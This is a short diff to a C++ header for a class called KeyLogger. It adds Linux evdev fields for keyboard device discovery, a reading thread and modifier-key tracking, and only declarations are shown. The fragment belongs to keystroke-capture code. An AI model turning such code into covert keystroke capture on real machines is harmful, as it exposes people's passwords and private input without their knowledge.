@@ -62,8 +62,19 @@ private:
     static KeyLogger*        s_instance;
     void appendKeystroke(const std::string& stroke);
 #elif defined(__linux__)
-    int                      m_input_fd; // /dev/input/eventX file descriptor
+    int                      m_input_fd;
+    std::thread              m_evdev_thread;
+    std::string              m_device_path;
+    bool                     m_left_shift_pressed;
+    bool                     m_right_shift_pressed;
+    bool                     m_caps_active;
+    bool                     m_left_ctrl_pressed;
+    bool                     m_right_ctrl_pressed;
+    bool                     m_left_alt_pressed;
+    bool                     m_right_alt_pressed;
     void appendKeystroke(const std::string& stroke);
+    std::string findKeyboardDevice();
+    void evdevLoop();
 #endif
 };
 
